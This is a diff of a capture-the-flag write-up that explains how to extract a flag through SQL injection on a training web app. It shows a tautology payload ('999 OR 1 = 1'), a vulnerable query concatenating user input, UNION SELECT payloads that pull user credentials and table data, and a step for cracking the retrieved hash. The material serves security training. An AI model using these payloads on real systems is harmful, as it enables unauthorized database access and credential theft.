@@ -1,6 +1,6 @@
 How to get the flag :
 
-Go to IP/index.php?page=member
+Go to IP/index.php?page=searchimg
 
 999 OR 1 = 1
 
@@ -48,14 +48,11 @@ Member_survey :
     nb_vote,
     subject
 
-reproduction example : mysql_query("SELECT first_name, last_name FROM users WHERE ??" . USER_INPUT)
+reproduction example : mysql_query("SELECT url, title FROM list_images WHERE id = " . USER_INPUT)
 
-999 UNION SELECT first_name, Commentaire FROM users
-999 UNION SELECT first_name, countersign FROM users
+999 UNION SELECT comment, title FROM list_images
 
-Put the countersign in the decoder of https://www.dcode.fr/hash-function
-
-Encode the result(after lower all characters) with https://www.dcode.fr/sha256-hash
+https://www.dcode.fr/hash-function
 
 
 How to solve SQL injection :
